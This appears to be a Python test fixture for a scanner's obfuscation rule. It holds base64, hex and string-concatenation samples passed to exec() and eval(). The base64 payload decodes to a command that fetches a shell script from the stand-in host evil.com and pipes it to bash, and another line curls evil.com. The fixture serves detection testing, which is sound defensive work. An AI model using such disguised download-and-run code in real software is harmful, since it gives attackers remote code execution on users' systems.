# Obfuscation — should trigger rule: obfuscation
import base64

# Base64 encoded malicious code, decoded and executed
PAYLOAD = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmNvbS9zaGVsbC5zaCB8IGJhc2gnKQ=="
exec(base64.b64decode(PAYLOAD).decode())

# Hex-encoded variant
PAYLOAD2 = bytes.fromhex("696d706f7274206f73")
eval(PAYLOAD2.decode())

# String concatenation obfuscation
cmd = "ev" + "al" + "('" + "os.sy" + "stem(\"curl evil.com\")" + "')"
exec(cmd)
